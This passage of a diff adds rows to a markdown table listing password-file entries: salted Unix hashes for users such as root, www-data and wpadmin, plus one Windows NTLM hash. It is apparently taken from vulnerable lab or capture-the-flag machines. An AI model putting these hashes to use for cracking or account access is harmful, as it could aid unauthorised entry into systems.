+| 50. | `reynard:$6$h54J.qxd$yL5md3J4dONwNl.36iA.mkcabQqRMmeZ0VFKxIVpXeNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::` |
+| 51. | `robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::` |
+| 52. | `robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBnTddK/:16752:0:99999:7:::` |
+| 53. | `root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::` |
+| 54. | `root:$1$DdHlo6rh$usiPcDoTR37eL7DAyLjhk1:0:0::0:0:Charlie &:/root:/bin/csh` |
+| 55. | `root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::` |
+| 56. | `root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::` |
+| 57. | `root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:0:99999:7:::` |
+| 58. | `root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::` |
+| 59. | `root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEgm9QfT1:18452:0:99999:7:::` |
+| 60. | `root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::` |
+| 61. | `root:$6$aorWKpxj$yOgku4F1ZRbqvSxxUtAYY2/6K/UU5wLobTSz/Pw5/ILvXgq9NibQ0/NQbOr1Wzp2bTbpNQr1jNNlaGjXDu5Yj1:17721:0:99999:7:::` |
+| 62. | `root:$6$BVgS5ne0$Q6rV3guK7QQUy7uRMwbQ3vv2Y5I9yQUhIzvrIhuiDso/o5UfDxZw7MMq8atR3UdJjhpkFVxVD0cVtjXQdPUAH.:17431:0:99999:7:::` |
+| 63. | `root:$6$CM3c1cdI$HbQWZlQdGEWV8yo3j7M84i1/RFK4G7fafTUIUYLWk52zm9O8KRLhqZenF8KbqsUjHlZQk4VmNEeEbBCRjOWbH0:17111:0:99999:7:::` |
+| 64. | `root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1ML2jH.:16695:0:99999:7:::` |
+| 65. | `root:$6$GpmQGQUN$8kLewzMF4ItmxezcryWqSPrXNRTH5TOQFKKkHjK2NSmrTg95xiYi.l8L.RYUL.8pAsj8s4EGvDy4dvENQIqNf.:15585:0:99999:7:::` |
+| 66. | `root:$6$kdMFceEg$pk9h93tdD7IomhE7L0Y396HO6fxSM.XDh9dgeBhKpdZlM/WYxCZe7yPRNHfZ5FvNRuILVp2NOsqNmgjoSx/IN0:18012:0:99999:7:::` |
+| 67. | `root:$6$L2m6DJwN$p/xas4tCNp19sda4q2ZzGC82Ix7GiEb7xvCbzWCsFHs/eR82G4/YOnni/.L69tpCkOGo5lm0AU7zh9lP5fL6A0:17247:0:99999:7:::` |
+| 68. | `root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdOhg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZaDioh0:15768:0:99999:7:::` |
+| 69. | `root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::` |
+| 70. | `root:$6$n.BA4A59$WeIF0ZbaB3VGgAxUZqGHnw01.GhL9oVYYFioh07RpPtBl49YdMahhtbYhxUjanXf/NJXiCHBvrNhdC53P1UX2.:17412:0:99999:7:::` |
+| 71. | `root:$6$O4bZf1Ju$0xcLPNyQkVcKT0CajZYBOTz4thlujMRjQ7XuFstUDWwYHKmVmJsDmzGXUwYbU1uqr6jxEvX4XJjSUgiwjPmEp0:17399:0:99999:7:::` |
+| 72. | `root:$6$P7ElNgGp$fNzyy4OgqSR1ANJXTgbpzp4U42JXG1qJ55iNV10NVJoX5UWjtckWD0oHmcTOj0lqObyWhFu2y3udHVpHaqYxf.:17238:0:99999:7:::` |
+| 73. | `root:$6$PnbVvEMS$OcseJT8lZRrgrW1JBpHJ252SPRxS6Rkh3oVBkrbRBZgHBD1wArL6FcyO5daqaon7waFKwSqbg5fIjFgzUVFMS1:18048:0:99999:7:::` |
+| 74. | `root:$6$qAoeosiW$fsOy8H/VKux.9K0T3Ww2D3FPNlO5LAaFytx/6t69Q7LPDSS/nNiP4xzq0Qab.Iz3uy5fYdH3Aw/K5v3ZMhRRH0:16756:0:99999:7:::` |
+| 75. | `root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt3mm91:17097:0:99999:7:::` |
+| 76. | `sarah:$6$DoSO7Ycr$2GtM5.8Lfx9Sw8X1fDMF.7zWDoVoy1892nyp0iFsqh5CfmtEROtxmejvQxu0N/8D7X8PQAGKYGl.gUb6/cG210:18010:0:99999:7:::` |
+| 77. | `scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF6T81Ki/MOyo.dJ0B8Xm5/wOrLk35Nqd0:17504:0:99999:7:::` |
+| 78. | `service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::` |
+| 79. | `setup:$6$PR5zOqWk$3MKXMgf6.4bLlznh0R87RB4qaOAcGhbE0Cs8xtUqVPHP8x0553/6aMZnfsZOWKXL0DOqUcVRkfCQN8DvjdZNc1:17086:0:99999:7:::` |
+| 80. | `shelly:$6$aYLAoDIC$CJ8f8WSCT6GYmbx7x8z5RfrbTG5mpDkkJkLW097hoiEw3tqei2cE7EcUTYdJTVMSa3PALZeBHjhiFR8Ba5jzf0:17431:0:99999:7:::` |
+| 81. | `smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBpAPvFCPuo73phXmpOoLsg5REXz.:16695:0:99999:7:::` |
+| 82. | `SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::` |
+| 83. | `susan:$6$5oSmml7K$0joeavcuzw4qxDJ2LsD1ablUIrFhycVoIXL3rxN/3q2lVpQOKLufta5tqMRIh30Gb32IBp5yZ7XvBR6uX9/SR/:17721:0:99999:7:::` |
+| 84. | `sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::` |
+| 85. | `togie:$6$dvOTOc6x$jpt1MVPeBsVlfkhVXl3sv21x2Ls2qle8ouv/JMdR6yNpt2nHHahrh0cyT.8PfVcNqlrAHYFkK2WYdSbxQ4Ivu1:17392:0:99999:7:::` |
+| 86. | `tom:$6$ptD/.gN.$n.B/5dODEQFteBwg75Ip9leeaaXSMesGbfZzoVHpZihMHfbWu45UpVZTc6razK1JLZ6817ckZhAJF776Dg/ZJ0:17407:0:99999:7:::` |
+| 87. | `user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::` |
+| 88. | `user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::` |
+| 89. | `user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::` |
+| 90. | `user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::` |
+| 91. | `user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::` |
+| 92. | `user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::` |
+| 93. | `user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::` |
+| 94. | `user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::` |
+| 95. | `user:$6$gLVDPSY5$CGHDuEBpkC90vX2xFD9NeJC0O9XfhVj9oFVvL8XbTRpBnt/7WJFpADj0zboPTKTqPbOHafZGUd/exj4OZ1Frc/:15585:0:99999:7:::` |
+| 96. | `veronica:$6$ud4650Og$j9dN4Xh6nHTDUQ5LpnrUzl6FdRiapcGvjg0JU2/Wx.G5Q.PFtbv.sa4OJyNnzTVsFEMmgnEZQV1nxGFiy56zS/:17033:0:99999:7:::` |
+| 97. | `vulnix:$6$tMOyhDF2$gExhASDVWJqHYn00.A8XLJb.DvE7bdD6NffAno3iY5zEkJwZ4yDTGMrhdVbkMXV1dlBT00DoGFR7oXbtDi3lQ0:15585:0:99999:7:::` |
+| 98. | `wpadmin:$6$FtTN/YPC$iidNFmRVpQ1p2kkfoOZ6OzNPqR95DQ/7G10aze2CA2W3ik/sHHyEPaNNY57tMvRDU0/Rs62FEimiKXD2VgEYC1:17096:0:99999:7:::` |
+| 99. | `www-data:$6$SYixzIan$P3cvyztSwA1lmILF3kpKcqZpYSDONYwMwplB62RWu1RklKqIGCX1zleXuVwzxjLcpU6bhiW9N03AWkzVUZhms.:17264:0:99999:7:::` |
